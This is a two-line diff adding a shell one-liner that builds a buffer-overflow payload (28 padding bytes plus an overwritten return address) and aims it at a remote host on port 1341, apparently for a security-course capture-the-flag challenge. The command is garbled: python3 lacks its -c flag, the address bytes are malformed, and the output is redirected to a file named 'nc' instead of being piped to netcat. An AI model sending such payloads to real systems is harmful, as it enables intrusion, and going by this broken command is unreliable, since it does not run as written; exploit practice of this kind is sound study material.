@@ -1,0 +1,2 @@
+python3 "import sys; 
+sys.stdout.buffer.write(28 * b'C' + b'\x4a\x93\x04\08')" > nc boverflow.comp6841.xyz 1341
